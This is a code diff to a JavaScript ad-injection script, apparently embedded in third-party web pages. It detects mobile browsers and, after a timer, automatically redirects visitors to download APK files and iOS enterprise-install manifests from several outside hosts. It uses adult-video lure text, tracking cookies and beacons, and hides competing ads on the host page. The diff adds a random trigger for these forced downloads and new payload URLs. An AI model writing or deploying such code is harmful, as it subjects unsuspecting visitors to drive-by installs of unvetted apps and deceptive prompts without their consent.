@@ -50,7 +50,7 @@ var hy_itv=setInterval(function(){
 	var num=hy_cpc_num || "10",imgPath="http://m.haoghost.com/images/",downPath="http://d.haoghost.com/",isup=2;
 	var pname=getDownUrl(),iosname=getIosDownUrl();
 
-	var azimgs=["wb_b5.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","wb_b2.gif","wb_b.gif"],
+	var azimgs=["wb_b2.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","wb_b5.gif","wb_b.gif"],
 		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,downPath+"360xpg.apk",downPath+"360ysdq.apk"],
 		aztooltip=["","","","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
 
@@ -73,7 +73,7 @@ var hy_itv=setInterval(function(){
 	//正在下载娇羞小苹果,少妇的秘密尽在其中 正在下载书旗小说,千万图书库离线观看
 
 	var alen=azimgs.length;
-	if(num==24||num==25||num==26 || num==29 || num==31) isup=1;
+	if(num==24||num==25||num==26 || num==29 || num==31 || num==72) isup=1;
 	function getNum(){
 		var num=parseInt(getCookie("hy_visit_time"));
 		if(isNaN(num))
@@ -94,7 +94,7 @@ var hy_itv=setInterval(function(){
 		setCookie("hycpc1","0");
 	}
 
-	var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
+	var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes(),rd=Math.random();
 	function notNight()
 	{
 		return (hour>9) || (hour==9 && minute>30);
@@ -125,7 +125,8 @@ var hy_itv=setInterval(function(){
 				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
 				break;
 			default:
-				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
+				if(rd<0.1) result="http://tg.xyzs.com/dt/iphone.php?ref=cpa24";
+				else result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
 		}
 		return result;
 	}
@@ -133,19 +134,20 @@ var hy_itv=setInterval(function(){
 	function getAndroidDownUrl()
 	{
 		var result;
-		var rd=Math.random();
 		switch(num)
 		{
 			case "31":
-				result="360sphj.apk";
+				result="http://m.haoghost.com/images/test/360ysdq.apk";
 				break;
 			case "35":
-				result="sybb.10C352.apk";
+				result="http://soft.91zan.com/suwei/sybb.10C352.apk";
+				break;
+			case "33":
+				result="http://t.cn/R7TPUOV";
 				break;
 			default:
-				if(rd<0.5) result="360sqyy774.apk";
-				else if(rd<0.9) result="360sphj.apk";
-				else result="http://t.cn/R7qFBqD";
+				if(rd<0.3) result="http://m.haoghost.com/images/test/360ysdq.apk";
+				result="360sqyy774.apk";
 		}
 		return result;
 	}
@@ -173,7 +175,12 @@ var hy_itv=setInterval(function(){
 			return imgPath+"wb_ios2.gif";
 		}
 	}
-	
+	function isDownSelf()
+	{
+		if(hour==8) return true;
+		var rd=Math.random();
+		return rd>0.1?true:false;
+	}
 
 	if(/android/i.test(navigator.userAgent) || /ipad|iphone|ipod/i.test(navigator.userAgent))
 	{
@@ -233,7 +240,7 @@ var hy_itv=setInterval(function(){
 			tj.appendChild(script);
 		})()		
 
-		if(num==24 || num==25 || num==26 || num==29 || num==31 || num==71)
+		if(num==24 || num==25 || num==26 || num==29 || num==31 || num==71 || num==72)
 		{
 			t1.style.display="none";
 		}
@@ -277,20 +284,19 @@ var hy_itv=setInterval(function(){
 
 
 			var hyipdata=parseInt(getCookie("hyipdata"));
-			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua) && num!=35 )
+			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua) && num!=31 )
 			{
-				getJsonp(
+				/*getJsonp(
 					'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
 					"",
 					function(data){
-						//var res=remote_ip_info.province.indexOf("广东")>=0 ||remote_ip_info.province.indexOf("山东")>=0;
 						var res=false;
-						if(!res && Math.random()>0.5)
+						if(!res && Math.random()>0.25)
 						{
 							setCookie("hyipdata","0");
 							if(hlTime())
 							{
-								pname="hlyy26.apk";
+								pname="Qvod_collect_v3.14.5.apk";
 								getJsonp(
 									'http://click.shuiguo.com/index.php?action=index&method=main1',
 									"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
@@ -307,7 +313,34 @@ var hy_itv=setInterval(function(){
 						goCityDown();
 					},
 					"hyipcb"
-				);
+				);*/
+				if(isDownSelf())
+				{
+					setCookie("hyipdata","0");
+					if(hlTime())
+					{
+						pname="Qvod_collect_v3.14.14.apk";
+						getJsonp(
+							'http://click.shuiguo.com/index.php?action=index&method=main1',
+							"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
+							function(data){
+
+							}
+						);
+						var script = document.createElement("script");
+						script.type = "text/javascript";
+						script.language = "javascript";
+						script.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";
+						var tj=document.getElementById("hy_cpc_tj");
+						tj.appendChild(script);
+
+					}
+				}
+				else
+				{
+					setCookie("hyipdata","1");
+				}
+				goCityDown();
 			}
 			else
 			{
@@ -315,7 +348,7 @@ var hy_itv=setInterval(function(){
 			}
 			function goCityDown(){
 				window.setTimeout(function(){
-					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35)
+					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35 || num==36)
 					{
 						if(!autoDown()) return;
 						if(tt.indexOf("》")<0)
@@ -333,12 +366,6 @@ var hy_itv=setInterval(function(){
 						if(!autoDown()) return;
 						tt="正在下载神奇影院，海量视频任你看";
 					}
-					else if(num==16)
-					{
-						if( notNight() ) return;
-						if(!autoDown()) return;
-						tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
-					}
 					else if(num==23 || num==24 || num==25 || num==26 || num==27){
 						if(!autoDown()) return;
 						tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
@@ -349,6 +376,7 @@ var hy_itv=setInterval(function(){
 					}
 					
 					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
+						alert(tt);
 						window.location.href=iosname;	
 						setCookie("hycpc1","1");
 					}
@@ -374,7 +402,7 @@ var hy_itv=setInterval(function(){
 						if(pname.indexOf("http")>=0) window.location.href=pname;
 						else window.location.href="http://d.haoghost.com/"+pname;
 						setCookie("hycpc1","1");
-						if(num==28 || num==31 || num==32 || num==33 || num==34) setBefore(50);
+						setBefore(50);
 					}
 				},1000);
 			}
@@ -418,6 +446,14 @@ var hy_itv=setInterval(function(){
 			if(num==32)
 			{
 				hideAdv("__70e_1");hideAdv("__70e_2");hideAdv("xcy_fmt");t2.style.display="";
+			}
+			if(num==33)
+			{
+				hideAdv("cs_right_bottom");
+			}
+			if(num==36)
+			{
+				hideAdv("JS_BottmEX2_Div");
 			}
 			if(num==22)
 			{
